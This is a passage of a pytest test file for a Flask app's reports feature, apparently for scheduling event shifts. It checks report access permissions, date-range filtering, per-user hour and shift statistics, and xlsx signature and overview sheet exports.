"""Tests for the reports blueprint."""

import io
import uuid
from datetime import date, datetime, timedelta, timezone
from decimal import Decimal
from types import SimpleNamespace

import pytest
from openpyxl import Workbook, load_workbook

from app.extensions import db
from app.models.assignment import Assignment, DebriefingRecord
from app.models.event import Event, EventSpot, EventStatus
from app.models.master_event import MasterEvent
from app.models.role import Role
from app.models.user import UserAccount
from app.routes.reports import _compute_user_stats, _parse_date_range, _work_summary_data
from app.xlsx import cell as _cell
from tests.conftest import _get_csrf, _login, _make_user


def _make_me(name: str = "Testovací nadřazená akce") -> MasterEvent:
    me = MasterEvent(name=name)
    db.session.add(me)
    db.session.commit()
    return me


def _make_event(
    me: MasterEvent,
    name: str = "Testovací akce",
    status: EventStatus = EventStatus.COMPLETED,
    start: datetime | None = None,
    end: datetime | None = None,
) -> Event:
    now = datetime.now(timezone.utc)
    ev = Event(
        name=name,
        master_event_id=me.id,
        status=status,
        start_datetime=start or now - timedelta(hours=4),
        end_datetime=end or now - timedelta(hours=2),
    )
    db.session.add(ev)
    db.session.commit()
    return ev


def _make_spot(event: Event) -> EventSpot:
    spot = EventSpot(event_id=event.id)
    db.session.add(spot)
    db.session.commit()
    return spot


def _make_assignment(spot: EventSpot, user: UserAccount, admin: UserAccount) -> Assignment:
    asgn = Assignment(spot_id=spot.id, user_id=user.id, assigned_by_id=admin.id)
    db.session.add(asgn)
    db.session.commit()
    return asgn


def _make_debriefing(asgn: Assignment, actual_hours: float = 2.0, patients: int = 3) -> DebriefingRecord:
    """Create a DebriefingRecord and set actual times/patients on the event."""
    # Set actual times on the event so actual_hours property works
    spot = db.session.get(EventSpot, asgn.spot_id)
    assert spot is not None
    event = db.session.get(Event, spot.event_id)
    assert event is not None
    event.actual_start_datetime = event.start_datetime
    event.actual_end_datetime = event.start_datetime + timedelta(hours=actual_hours)
    event.post_event_count = patients
    dr = DebriefingRecord(
        assignment_id=asgn.id,
        submitted_by_id=asgn.user_id,
        event_note_status=1,
    )
    db.session.add(dr)
    db.session.commit()
    return dr


# ── Index ─────────────────────────────────────────────────────────────────────


class TestReportsIndex:
    def test_redirect_when_not_logged_in(self, client):
        resp = client.get("/reports/", follow_redirects=False)
        assert resp.status_code == 302

    def test_admin_can_access_index(self, app, client):
        with app.app_context():
            _make_user("admin_rep@test.com", "Admin Rep", Role.ADMIN)
        _login(client, "admin_rep@test.com")
        resp = client.get("/reports/")
        assert resp.status_code == 200
        assert "Přehledy".encode() in resp.data

    def test_member_can_access_index(self, app, client):
        """Members have report.view permission."""
        with app.app_context():
            _make_user("member_rep@test.com", "Member Rep", Role.MEMBER)
        _login(client, "member_rep@test.com")
        resp = client.get("/reports/")
        assert resp.status_code == 200

    def test_unauthenticated_cannot_access_index(self, client):
        resp = client.get("/reports/", follow_redirects=False)
        assert resp.status_code == 302


# ── Per-user report ───────────────────────────────────────────────────────────


class TestUserReport:
    def test_member_can_access_own_report(self, app, client):
        with app.app_context():
            user = _make_user("member_own@test.com", "Own Member", Role.MEMBER)
            user_id = user.id
        _login(client, "member_own@test.com")
        resp = client.get(f"/reports/user/{user_id}")
        assert resp.status_code == 200

    def test_user_without_permission_cannot_access_other_user_report(self, app, client):
        """A user with no roles (no report.view) cannot view another user's report."""
        with app.app_context():
            # Create user with no roles (no report.view)
            norole = UserAccount(email="norole@test.com", name="No Role", is_active=True)
            norole.set_password("testpass123")
            db.session.add(norole)
            other = _make_user("other_norole@test.com", "Other User", Role.MEMBER)
            other_id = other.id
            db.session.commit()
        _login(client, "norole@test.com")
        resp = client.get(f"/reports/user/{other_id}")
        assert resp.status_code == 403

    def test_user_without_permission_can_access_own_report(self, app, client):
        """A user with no roles can still view their own report."""
        with app.app_context():
            norole = UserAccount(email="norole_own@test.com", name="No Role Own", is_active=True)
            norole.set_password("testpass123")
            db.session.add(norole)
            db.session.commit()
            norole_id = norole.id
        _login(client, "norole_own@test.com")
        resp = client.get(f"/reports/user/{norole_id}")
        assert resp.status_code == 200

    def test_admin_can_access_any_user_report(self, app, client):
        with app.app_context():
            _make_user("admin_ur@test.com", "Admin UR", Role.ADMIN)
            member = _make_user("member_c@test.com", "Member C", Role.MEMBER)
            member_id = member.id
        _login(client, "admin_ur@test.com")
        resp = client.get(f"/reports/user/{member_id}")
        assert resp.status_code == 200

    def test_coordinator_can_access_other_user_report(self, app, client):
        with app.app_context():
            _make_user("coord_ur@test.com", "Coord UR", Role.COORDINATOR)
            member = _make_user("member_d@test.com", "Member D", Role.MEMBER)
            member_id = member.id
        _login(client, "coord_ur@test.com")
        resp = client.get(f"/reports/user/{member_id}")
        assert resp.status_code == 200

    def test_404_for_nonexistent_user(self, app, client):
        with app.app_context():
            _make_user("admin_404@test.com", "Admin 404", Role.ADMIN)
        _login(client, "admin_404@test.com")
        resp = client.get(f"/reports/user/{uuid.uuid4()}")
        assert resp.status_code == 404

    def test_user_report_shows_correct_event_count(self, app, client):
        with app.app_context():
            admin = _make_user("admin_cnt@test.com", "Admin Cnt", Role.ADMIN)
            member = _make_user("member_cnt@test.com", "Member Cnt", Role.MEMBER)
            member_id = member.id

            me = _make_me("ME Count")
            ev1 = _make_event(me, "Akce 1", EventStatus.COMPLETED)
            ev2 = _make_event(me, "Akce 2", EventStatus.COMPLETED)
            # one event not assigned to member
            _make_event(me, "Akce 3", EventStatus.COMPLETED)

            spot1 = _make_spot(ev1)
            spot2 = _make_spot(ev2)
            _make_assignment(spot1, member, admin)
            _make_assignment(spot2, member, admin)

        _login(client, "admin_cnt@test.com")
        resp = client.get(f"/reports/user/{member_id}")
        assert resp.status_code == 200
        # member has 2 assignments
        assert b"Akce 1" in resp.data
        assert b"Akce 2" in resp.data
        assert b"Akce 3" not in resp.data

    def test_user_report_shows_debriefing_data(self, app, client):
        with app.app_context():
            admin = _make_user("admin_deb@test.com", "Admin Deb", Role.ADMIN)
            member = _make_user("member_deb@test.com", "Member Deb", Role.MEMBER)
            member_id = member.id

            me = _make_me("ME Deb")
            ev = _make_event(me, "Debriefing Akce", EventStatus.COMPLETED)
            spot = _make_spot(ev)
            asgn = _make_assignment(spot, member, admin)
            _make_debriefing(asgn, actual_hours=5.5, patients=7)

        _login(client, "admin_deb@test.com")
        resp = client.get(f"/reports/user/{member_id}")
        assert resp.status_code == 200
        assert b"5,5" in resp.data
        assert b"7" in resp.data

    def test_user_report_sum_row_planned_hours_is_dash(self, app, client):
        """Sum row for completed events must show — in the planned hours column (issue #108)."""
        with app.app_context():
            admin = _make_user("admin_sum@test.com", "Admin Sum", Role.ADMIN)
            member = _make_user("member_sum@test.com", "Member Sum", Role.MEMBER)
            member_id = member.id

            me = _make_me("ME Sum")
            ev = _make_event(me, "Completed Akce", EventStatus.COMPLETED)
            spot = _make_spot(ev)
            _make_assignment(spot, member, admin)

        _login(client, "admin_sum@test.com")
        resp = client.get(f"/reports/user/{member_id}")
        assert resp.status_code == 200
        # The tfoot planned-hours cell must be a dash, not a number
        assert b"Celkem (dokon\xc4\x8den\xc3\xa9 akce)" in resp.data
        html = resp.data.decode("utf-8")
        # Locate the tfoot section and confirm it contains the em-dash
        tfoot_start = html.find("<tfoot")
        assert tfoot_start != -1
        tfoot_html = html[tfoot_start:]
        assert "—" in tfoot_html


class TestUserReportDateFilter:
    """Date range filter on the per-user report."""

    def _setup(self, app, email_suffix: str) -> tuple[str, str]:
        """Create admin + member users and return (admin_email, member_id)."""
        with app.app_context():
            _make_user(f"admin_dr_{email_suffix}@test.com", "Admin DR", Role.ADMIN)
            member = _make_user(f"member_dr_{email_suffix}@test.com", "Member DR", Role.MEMBER)
            return f"admin_dr_{email_suffix}@test.com", str(member.id)

    def test_from_date_excludes_earlier_events(self, app, client):
        admin_email, member_id = self._setup(app, "from")
        with app.app_context():
            admin = db.session.scalar(db.select(UserAccount).where(UserAccount.email == admin_email))
            member = db.session.get(UserAccount, member_id)
            me = _make_me("DR From ME")
            early = _make_event(
                me,
                "Early Event",
                start=datetime(2025, 1, 10, 10, 0, tzinfo=timezone.utc),
                end=datetime(2025, 1, 10, 18, 0, tzinfo=timezone.utc),
            )
            later = _make_event(
                me,
                "Later Event",
                start=datetime(2025, 3, 10, 10, 0, tzinfo=timezone.utc),
                end=datetime(2025, 3, 10, 18, 0, tzinfo=timezone.utc),
            )
            _make_assignment(_make_spot(early), member, admin)
            _make_assignment(_make_spot(later), member, admin)

        _login(client, admin_email)
        resp = client.get(f"/reports/user/{member_id}?from_date=2025-02-01")
        assert resp.status_code == 200
        assert b"Early Event" not in resp.data
        assert b"Later Event" in resp.data

    def test_to_date_excludes_later_events(self, app, client):
        admin_email, member_id = self._setup(app, "to")
        with app.app_context():
            admin = db.session.scalar(db.select(UserAccount).where(UserAccount.email == admin_email))
            member = db.session.get(UserAccount, member_id)
            me = _make_me("DR To ME")
            early = _make_event(
                me,
                "Early Event",
                start=datetime(2025, 1, 10, 10, 0, tzinfo=timezone.utc),
                end=datetime(2025, 1, 10, 18, 0, tzinfo=timezone.utc),
            )
            later = _make_event(
                me,
                "Later Event",
                start=datetime(2025, 3, 10, 10, 0, tzinfo=timezone.utc),
                end=datetime(2025, 3, 10, 18, 0, tzinfo=timezone.utc),
            )
            _make_assignment(_make_spot(early), member, admin)
            _make_assignment(_make_spot(later), member, admin)

        _login(client, admin_email)
        resp = client.get(f"/reports/user/{member_id}?to_date=2025-02-01")
        assert resp.status_code == 200
        assert b"Early Event" in resp.data
        assert b"Later Event" not in resp.data

    def test_both_dates_show_only_events_in_range(self, app, client):
        admin_email, member_id = self._setup(app, "both")
        with app.app_context():
            admin = db.session.scalar(db.select(UserAccount).where(UserAccount.email == admin_email))
            member = db.session.get(UserAccount, member_id)
            me = _make_me("DR Both ME")
            before = _make_event(
                me,
                "Before Range",
                start=datetime(2025, 1, 5, 10, 0, tzinfo=timezone.utc),
                end=datetime(2025, 1, 5, 18, 0, tzinfo=timezone.utc),
            )
            inside = _make_event(
                me,
                "Inside Range",
                start=datetime(2025, 2, 15, 10, 0, tzinfo=timezone.utc),
                end=datetime(2025, 2, 15, 18, 0, tzinfo=timezone.utc),
            )
            after = _make_event(
                me,
                "After Range",
                start=datetime(2025, 4, 1, 10, 0, tzinfo=timezone.utc),
                end=datetime(2025, 4, 1, 18, 0, tzinfo=timezone.utc),
            )
            for ev in [before, inside, after]:
                _make_assignment(_make_spot(ev), member, admin)

        _login(client, admin_email)
        resp = client.get(f"/reports/user/{member_id}?from_date=2025-02-01&to_date=2025-03-01")
        assert resp.status_code == 200
        assert b"Before Range" not in resp.data
        assert b"Inside Range" in resp.data
        assert b"After Range" not in resp.data

    def test_to_date_is_inclusive_of_end_day(self, app, client):
        """An event starting on to_date itself must be included (+1 day boundary)."""
        admin_email, member_id = self._setup(app, "inc")
        with app.app_context():
            admin = db.session.scalar(db.select(UserAccount).where(UserAccount.email == admin_email))
            member = db.session.get(UserAccount, member_id)
            me = _make_me("DR Inc ME")
            on_boundary = _make_event(
                me,
                "Boundary Event",
                start=datetime(2025, 3, 31, 10, 0, tzinfo=timezone.utc),
                end=datetime(2025, 3, 31, 18, 0, tzinfo=timezone.utc),
            )
            _make_assignment(_make_spot(on_boundary), member, admin)

        _login(client, admin_email)
        resp = client.get(f"/reports/user/{member_id}?from_date=2025-01-01&to_date=2025-03-31")
        assert resp.status_code == 200
        assert b"Boundary Event" in resp.data

    def test_invalid_date_shows_error(self, app, client):
        admin_email, member_id = self._setup(app, "err")
        _login(client, admin_email)
        resp = client.get(f"/reports/user/{member_id}?from_date=not-a-date")
        assert resp.status_code == 200
        assert "Neplatný formát data".encode() in resp.data


# ── Per-ME report ─────────────────────────────────────────────────────────────


class TestMEReport:
    def test_admin_can_access_me_report(self, app, client):
        with app.app_context():
            _make_user("admin_me@test.com", "Admin ME", Role.ADMIN)
            me = _make_me("ME Test Report")
            me_id = me.id
        _login(client, "admin_me@test.com")
        resp = client.get(f"/reports/master-event/{me_id}")
        assert resp.status_code == 200
        assert b"ME Test Report" in resp.data

    def test_member_can_access_me_report(self, app, client):
        with app.app_context():
            _make_user("member_me@test.com", "Member ME", Role.MEMBER)
            me = _make_me("ME Member Report")
            me_id = me.id
        _login(client, "member_me@test.com")
        resp = client.get(f"/reports/master-event/{me_id}")
        assert resp.status_code == 200

    def test_unauthenticated_cannot_access_me_report(self, app, client):
        with app.app_context():
            me = _make_me("ME Viewer")
            me_id = me.id
        resp = client.get(f"/reports/master-event/{me_id}", follow_redirects=False)
        assert resp.status_code == 302

    def test_me_report_404_for_nonexistent(self, app, client):
        with app.app_context():
            _make_user("admin_me404@test.com", "Admin ME 404", Role.ADMIN)
        _login(client, "admin_me404@test.com")
        resp = client.get("/reports/master-event/99999")
        assert resp.status_code == 404

    def test_me_report_shows_events(self, app, client):
        with app.app_context():
            admin = _make_user("admin_mev@test.com", "Admin MEV", Role.ADMIN)
            member = _make_user("member_mev@test.com", "Member MEV", Role.MEMBER)
            me = _make_me("ME With Events")
            me_id = me.id
            ev = _make_event(me, "Event V1", EventStatus.COMPLETED)
            spot = _make_spot(ev)
            asgn = _make_assignment(spot, member, admin)
            _make_debriefing(asgn, actual_hours=3.0, patients=2)
        _login(client, "admin_mev@test.com")
        resp = client.get(f"/reports/master-event/{me_id}")
        assert resp.status_code == 200
        assert b"Event V1" in resp.data
        assert b"3,0" in resp.data


# ── Date-range report ─────────────────────────────────────────────────────────


class TestDateRangeReport:
    def test_get_shows_form(self, app, client):
        with app.app_context():
            _make_user("admin_dr@test.com", "Admin DR", Role.ADMIN)
        _login(client, "admin_dr@test.com")
        resp = client.get("/reports/date-range")
        assert resp.status_code == 200
        assert b"from_date" in resp.data
        assert b"to_date" in resp.data

    def test_get_with_params_shows_results(self, app, client):
        with app.app_context():
            _make_user("admin_drp@test.com", "Admin DRP", Role.ADMIN)
            me = _make_me("ME DR Params")
            now = datetime.now(timezone.utc)
            _make_event(
                me,
                "DR Akce",
                EventStatus.COMPLETED,
                start=now - timedelta(days=1),
                end=now - timedelta(days=1) + timedelta(hours=2),
            )
        _login(client, "admin_drp@test.com")
        from_d = (datetime.now(timezone.utc) - timedelta(days=7)).strftime("%Y-%m-%d")
        to_d = datetime.now(timezone.utc).strftime("%Y-%m-%d")
        resp = client.get(f"/reports/date-range?from_date={from_d}&to_date={to_d}")
        assert resp.status_code == 200
        assert b"DR Akce" in resp.data

    def test_date_range_only_returns_events_in_range(self, app, client):
        with app.app_context():
            _make_user("admin_drr@test.com", "Admin DRR", Role.ADMIN)
            me = _make_me("ME DR Range")
            now = datetime.now(timezone.utc)
            # inside range
            _make_event(
                me,
                "In Range",
                EventStatus.COMPLETED,
                start=now - timedelta(days=3),
                end=now - timedelta(days=3) + timedelta(hours=2),
            )
            # outside range
            _make_event(
                me,
                "Out of Range",
                EventStatus.COMPLETED,
                start=now - timedelta(days=30),
                end=now - timedelta(days=30) + timedelta(hours=2),
            )
        _login(client, "admin_drr@test.com")
        from_d = (datetime.now(timezone.utc) - timedelta(days=7)).strftime("%Y-%m-%d")
        to_d = datetime.now(timezone.utc).strftime("%Y-%m-%d")
        resp = client.get(f"/reports/date-range?from_date={from_d}&to_date={to_d}")
        assert resp.status_code == 200
        assert b"In Range" in resp.data
        assert b"Out of Range" not in resp.data

    def test_date_range_empty_result_for_no_events(self, app, client):
        with app.app_context():
            _make_user("admin_dre@test.com", "Admin DRE", Role.ADMIN)
        _login(client, "admin_dre@test.com")
        resp = client.get("/reports/date-range?from_date=2000-01-01&to_date=2000-01-31")
        assert resp.status_code == 200
        # Should not error, may show empty message
        assert b"date-range" in resp.data or b"from_date" in resp.data

    def test_unauthenticated_cannot_access_date_range(self, client):
        resp = client.get("/reports/date-range", follow_redirects=False)
        assert resp.status_code == 302


# ── UserStats / _compute_user_stats unit tests ────────────────────────────────


class TestComputeUserStats:
    """Unit tests for the _compute_user_stats helper."""

    def _make_fake_event(
        self,
        status: EventStatus,
        start: datetime,
        end: datetime,
        paid: bool = True,
        actual_start: datetime | None = None,
        actual_end: datetime | None = None,
    ):
        """Return a simple namespace that mimics the Event properties used by _compute_user_stats."""

        actual_hours: Decimal | None = None
        if actual_start and actual_end:
            delta = actual_end - actual_start
            actual_hours = Decimal(str(round(delta.total_seconds() / 3600, 1)))

        scheduled_delta = end - start
        scheduled_hours = Decimal(str(round(scheduled_delta.total_seconds() / 3600, 1)))

        return SimpleNamespace(
            status=status,
            start_datetime=start,
            end_datetime=end,
            paid=paid,
            actual_hours=actual_hours,
            scheduled_hours=scheduled_hours,
        )

    def test_completed_shift_counts_served(self):

        now = datetime.now(timezone.utc)
        ev = self._make_fake_event(
            EventStatus.COMPLETED,
            now - timedelta(hours=4),
            now - timedelta(hours=2),
        )
        stats = _compute_user_stats([(None, ev)], now)  # type: ignore[arg-type]
        assert stats.shifts_served == 1
        assert stats.shifts_planned == 0

    def test_future_event_counts_planned(self):

        now = datetime.now(timezone.utc)
        ev = self._make_fake_event(
            EventStatus.ASSIGNMENTS_OPEN,
            now + timedelta(days=1),
            now + timedelta(days=1, hours=3),
        )
        stats = _compute_user_stats([(None, ev)], now)  # type: ignore[arg-type]
        assert stats.shifts_planned == 1
        assert stats.shifts_served == 0

    def test_cancelled_event_excluded(self):

        now = datetime.now(timezone.utc)
        ev = self._make_fake_event(
            EventStatus.CANCELLED,
            now - timedelta(hours=4),
            now - timedelta(hours=2),
        )
        stats = _compute_user_stats([(None, ev)], now)  # type: ignore[arg-type]
        assert stats.shifts_served == 0
        assert stats.shifts_planned == 0
        assert stats.hours_total == 0

    def test_actual_hours_used_when_available(self):

        now = datetime.now(timezone.utc)
        ev = self._make_fake_event(
            EventStatus.COMPLETED,
            now - timedelta(hours=8),
            now - timedelta(hours=4),
            actual_start=now - timedelta(hours=7),
            actual_end=now - timedelta(hours=5),  # 2 actual hours
        )
        stats = _compute_user_stats([(None, ev)], now)  # type: ignore[arg-type]
        assert stats.hours_served == Decimal("2")

    def test_planned_hours_fallback_for_completed_without_actuals(self):

        now = datetime.now(timezone.utc)
        ev = self._make_fake_event(
            EventStatus.COMPLETED,
            now - timedelta(hours=4),
            now - timedelta(hours=2),  # 2 planned hours, no actuals
        )
        stats = _compute_user_stats([(None, ev)], now)  # type: ignore[arg-type]
        assert stats.hours_served == Decimal("2")

    def test_unpaid_event_counts_hours_free(self):

        now = datetime.now(timezone.utc)
        ev = self._make_fake_event(
            EventStatus.COMPLETED,
            now - timedelta(hours=4),
            now - timedelta(hours=2),
            paid=False,
        )
        stats = _compute_user_stats([(None, ev)], now)  # type: ignore[arg-type]
        assert stats.hours_free == Decimal("2")

    def test_paid_event_does_not_count_hours_free(self):

        now = datetime.now(timezone.utc)
        ev = self._make_fake_event(
            EventStatus.COMPLETED,
            now - timedelta(hours=4),
            now - timedelta(hours=2),
            paid=True,
        )
        stats = _compute_user_stats([(None, ev)], now)  # type: ignore[arg-type]
        assert stats.hours_free == 0

    def test_last_and_next_shift_dates(self):
        """_compute_user_stats sets last_shift but not next_shift (handled by _resolve_next_shifts)."""

        now = datetime.now(timezone.utc)
        past_ev = self._make_fake_event(
            EventStatus.COMPLETED,
            now - timedelta(days=5),
            now - timedelta(days=5) + timedelta(hours=2),
        )
        future_ev = self._make_fake_event(
            EventStatus.PUBLISHED,
            now + timedelta(days=3),
            now + timedelta(days=3, hours=2),
        )
        stats = _compute_user_stats([(None, past_ev), (None, future_ev)], now)  # type: ignore[arg-type]
        assert stats.last_shift is not None
        assert stats.last_shift < now
        # next_shift is resolved globally by _resolve_next_shifts, not here
        assert stats.next_shift is None

    def test_shifts_and_hours_totals(self):

        now = datetime.now(timezone.utc)
        ev1 = self._make_fake_event(
            EventStatus.COMPLETED,
            now - timedelta(hours=4),
            now - timedelta(hours=2),
        )
        ev2 = self._make_fake_event(
            EventStatus.PUBLISHED,
            now + timedelta(hours=2),
            now + timedelta(hours=4),
        )
        stats = _compute_user_stats([(None, ev1), (None, ev2)], now)  # type: ignore[arg-type]
        assert stats.shifts_total == 2
        assert stats.hours_total == Decimal("4")


# ── Own report shortcut ────────────────────────────────────────────────────────


class TestOwnReportShortcut:
    def test_own_report_redirects_to_user_report(self, app, client):
        with app.app_context():
            user = _make_user("member_own@test.com", "Member Own", Role.MEMBER)
            user_id = user.id
        _login(client, "member_own@test.com")
        resp = client.get("/reports/user", follow_redirects=False)
        assert resp.status_code == 302
        assert str(user_id) in resp.headers["Location"]

    def test_own_report_unauthenticated_redirects_to_login(self, client):
        resp = client.get("/reports/user", follow_redirects=False)
        assert resp.status_code == 302
        assert "login" in resp.headers["Location"].lower()


# ── Per-user stats in ME report ───────────────────────────────────────────────


class TestMEReportUserStats:
    def test_me_report_shows_participant_stats(self, app, client):
        with app.app_context():
            admin = _make_user("admin_mestat@test.com", "Admin MEStat", Role.ADMIN)
            member = _make_user("member_mestat@test.com", "Member MEStat", Role.MEMBER)
            me = _make_me("ME Stats Test")
            me_id = me.id
            ev = _make_event(me, "Stat Akce", EventStatus.COMPLETED)
            spot = _make_spot(ev)
            _make_assignment(spot, member, admin)
        _login(client, "admin_mestat@test.com")
        resp = client.get(f"/reports/master-event/{me_id}")
        assert resp.status_code == 200
        assert "Statistiky účastníků".encode() in resp.data
        assert b"Member MEStat" in resp.data


# ── Per-user stats in date-range report ──────────────────────────────────────


class TestDateRangeUserStats:
    def test_date_range_shows_participant_stats(self, app, client):
        with app.app_context():
            admin = _make_user("admin_drstat@test.com", "Admin DRStat", Role.ADMIN)
            member = _make_user("member_drstat@test.com", "Member DRStat", Role.MEMBER)
            me = _make_me("ME DR Stats")
            now = datetime.now(timezone.utc)
            ev = _make_event(
                me,
                "DR Stat Akce",
                EventStatus.COMPLETED,
                start=now - timedelta(days=2),
                end=now - timedelta(days=2) + timedelta(hours=3),
            )
            spot = _make_spot(ev)
            _make_assignment(spot, member, admin)
        _login(client, "admin_drstat@test.com")
        from_d = (datetime.now(timezone.utc) - timedelta(days=7)).strftime("%Y-%m-%d")
        to_d = datetime.now(timezone.utc).strftime("%Y-%m-%d")
        resp = client.get(f"/reports/date-range?from_date={from_d}&to_date={to_d}")
        assert resp.status_code == 200
        assert "Statistiky účastníků".encode() in resp.data
        assert b"Member DRStat" in resp.data


# ── Printout (xlsx export) ────────────────────────────────────────────────────

XLSX_CONTENT_TYPE = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"


def _post_printout(client, **form_fields):
    csrf = _get_csrf(client, "/reports/printout")
    data = {"csrf_token": csrf, **form_fields}
    return client.post("/reports/printout", data=data, follow_redirects=False)


def _xlsx_sheets(response_data: bytes):
    """Load workbook from response bytes; return dict of sheet_name → list of row tuples."""
    wb = load_workbook(filename=io.BytesIO(response_data))
    return {title: [tuple(cell.value for cell in row) for row in wb[title].iter_rows()] for title in wb.sheetnames}


class TestPrintoutReport:
    def test_get_shows_form(self, app, client):
        with app.app_context():
            _make_user("admin_po@test.com", "Admin PO", Role.ADMIN)
        _login(client, "admin_po@test.com")
        resp = client.get("/reports/printout")
        assert resp.status_code == 200
        assert b"from_date" in resp.data

    def test_unauthenticated_redirected(self, client):
        resp = client.get("/reports/printout", follow_redirects=False)
        assert resp.status_code == 302

    def test_no_dates_no_me_returns_error(self, app, client):
        with app.app_context():
            _make_user("admin_po2@test.com", "Admin PO2", Role.ADMIN)
        _login(client, "admin_po2@test.com")
        resp = _post_printout(client)
        assert resp.status_code == 200
        assert "alespoň".encode() in resp.data

    def test_invalid_date_returns_error(self, app, client):
        with app.app_context():
            _make_user("admin_po3@test.com", "Admin PO3", Role.ADMIN)
        _login(client, "admin_po3@test.com")
        resp = _post_printout(client, from_date="notadate", to_date="alsonotadate")
        assert resp.status_code == 200
        assert "Neplatné datum".encode() in resp.data

    def test_from_after_to_returns_error(self, app, client):
        with app.app_context():
            _make_user("admin_po4@test.com", "Admin PO4", Role.ADMIN)
        _login(client, "admin_po4@test.com")
        resp = _post_printout(client, from_date="2030-06-10", to_date="2030-06-01")
        assert resp.status_code == 200
        assert "před".encode() in resp.data

    def test_no_matching_events_shows_warning(self, app, client):
        with app.app_context():
            _make_user("admin_po5@test.com", "Admin PO5", Role.ADMIN)
        _login(client, "admin_po5@test.com")
        resp = _post_printout(client, from_date="2000-01-01", to_date="2000-01-31")
        assert resp.status_code == 200
        assert "Žádné akce nevyhovovaly zadaným filtrům.".encode() in resp.data

    def test_date_range_returns_xlsx(self, app, client):
        with app.app_context():
            _make_user("admin_po6@test.com", "Admin PO6", Role.ADMIN)
            me = _make_me("Printout ME")
            now = datetime.now(timezone.utc)
            _make_event(
                me,
                "Printout Akce",
                EventStatus.PUBLISHED,
                start=now - timedelta(days=1),
                end=now - timedelta(days=1) + timedelta(hours=2),
            )
        _login(client, "admin_po6@test.com")
        from_d = (datetime.now(timezone.utc) - timedelta(days=7)).strftime("%Y-%m-%d")
        to_d = datetime.now(timezone.utc).strftime("%Y-%m-%d")
        resp = _post_printout(client, from_date=from_d, to_date=to_d)
        assert resp.status_code == 200
        assert resp.content_type == XLSX_CONTENT_TYPE

    def test_me_only_no_dates_returns_xlsx(self, app, client):
        with app.app_context():
            _make_user("admin_po7@test.com", "Admin PO7", Role.ADMIN)
            me = _make_me("Printout ME2")
            now = datetime.now(timezone.utc)
            _make_event(
                me,
                "ME Only Akce",
                EventStatus.PUBLISHED,
                start=now - timedelta(days=1),
                end=now - timedelta(days=1) + timedelta(hours=2),
            )
            me_id = me.id
        _login(client, "admin_po7@test.com")
        resp = _post_printout(client, me_id=str(me_id))
        assert resp.status_code == 200
        assert resp.content_type == XLSX_CONTENT_TYPE

    def test_draft_events_excluded(self, app, client):
        with app.app_context():
            _make_user("admin_po8@test.com", "Admin PO8", Role.ADMIN)
            me = _make_me("Printout ME Draft")
            now = datetime.now(timezone.utc)
            _make_event(
                me,
                "Draft Akce",
                EventStatus.DRAFT,
                start=now - timedelta(days=1),
                end=now - timedelta(days=1) + timedelta(hours=2),
            )
            me_id = me.id
        _login(client, "admin_po8@test.com")
        resp = _post_printout(client, me_id=str(me_id))
        assert resp.status_code == 200
        # No xlsx — warning flash shown instead
        assert resp.content_type != XLSX_CONTENT_TYPE

    def test_archived_events_excluded(self, app, client):
        with app.app_context():
            _make_user("admin_po9@test.com", "Admin PO9", Role.ADMIN)
            me = _make_me("Printout ME Archived")
            now = datetime.now(timezone.utc)
            ev = _make_event(
                me,
                "Archived Akce",
                EventStatus.COMPLETED,
                start=now - timedelta(days=1),
                end=now - timedelta(days=1) + timedelta(hours=2),
            )
            ev.archived = True
            db.session.commit()
            me_id = me.id
        _login(client, "admin_po9@test.com")
        resp = _post_printout(client, me_id=str(me_id))
        assert resp.status_code == 200
        assert resp.content_type != XLSX_CONTENT_TYPE

    def test_signature_sheet_has_one_row_per_spot(self, app, client):
        with app.app_context():
            admin = _make_user("admin_po10@test.com", "Admin PO10", Role.ADMIN)
            member = _make_user("member_po10@test.com", "Member PO10", Role.MEMBER)
            me = _make_me("Printout Spots ME")
            now = datetime.now(timezone.utc)
            ev = _make_event(
                me,
                "Spots Akce",
                EventStatus.PUBLISHED,
                start=now - timedelta(days=1),
                end=now - timedelta(days=1) + timedelta(hours=2),
            )
            spot1 = _make_spot(ev)
            _make_spot(ev)
            _make_assignment(spot1, member, admin)
            me_id = me.id
        _login(client, "admin_po10@test.com")
        resp = _post_printout(client, me_id=str(me_id))
        assert resp.status_code == 200
        assert resp.content_type == XLSX_CONTENT_TYPE

        sheets = _xlsx_sheets(resp.data)
        assert "Podpisy" in sheets
        # Title (row 1), info (row 2), header (row 3), then 2 data rows (one per spot)
        data_rows = [r for r in sheets["Podpisy"][3:] if any(v for v in r)]
        assert len(data_rows) == 2

    def test_signature_sheet_empty_spot_appears(self, app, client):
        """An unassigned spot shows up in the signature sheet with no person name."""
        with app.app_context():
            _make_user("admin_po11@test.com", "Admin PO11", Role.ADMIN)
            me = _make_me("Printout Empty Spot ME")
            now = datetime.now(timezone.utc)
            ev = _make_event(
                me,
                "Empty Spot Akce",
                EventStatus.PUBLISHED,
                start=now - timedelta(days=1),
                end=now - timedelta(days=1) + timedelta(hours=2),
            )
            _make_spot(ev)  # no assignment
            me_id = me.id
        _login(client, "admin_po11@test.com")
        resp = _post_printout(client, me_id=str(me_id))
        assert resp.status_code == 200
        assert resp.content_type == XLSX_CONTENT_TYPE

        sheets = _xlsx_sheets(resp.data)
        data_rows = [r for r in sheets["Podpisy"][3:] if any(v for v in r)]
        assert len(data_rows) == 1
        person_col = 2  # 0-indexed: Datum=0, Název akce=1, Jméno=2
        assert data_rows[0][person_col] is None or data_rows[0][person_col] == ""

    def test_overview_sheet_has_one_row_per_event(self, app, client):
        with app.app_context():
            _make_user("admin_po12@test.com", "Admin PO12", Role.ADMIN)
            me = _make_me("Printout Overview ME")
            now = datetime.now(timezone.utc)
            _make_event(
                me,
                "Overview Akce 1",
                EventStatus.PUBLISHED,
                start=now - timedelta(days=2),
                end=now - timedelta(days=2) + timedelta(hours=2),
            )
            _make_event(
                me,
                "Overview Akce 2",
                EventStatus.COMPLETED,
                start=now - timedelta(days=1),
                end=now - timedelta(days=1) + timedelta(hours=2),
            )
            me_id = me.id
        _login(client, "admin_po12@test.com")
        resp = _post_printout(client, me_id=str(me_id))
        assert resp.status_code == 200
        assert resp.content_type == XLSX_CONTENT_TYPE

        sheets = _xlsx_sheets(resp.data)
        assert "Přehled" in sheets
        data_rows = [r for r in sheets["Přehled"][3:] if any(v for v in r)]
        assert len(data_rows) == 2

    def test_overview_sheet_cells_contain_only_names(self, app, client):
        """Spot columns in the overview sheet show person names, not roles."""
        with app.app_context():
            admin = _make_user("admin_po13@test.com", "Admin PO13", Role.ADMIN)
            member = _make_user("member_po13@test.com", "Member PO13", Role.MEMBER)
            me = _make_me("Printout Names ME")
            now = datetime.now(timezone.utc)
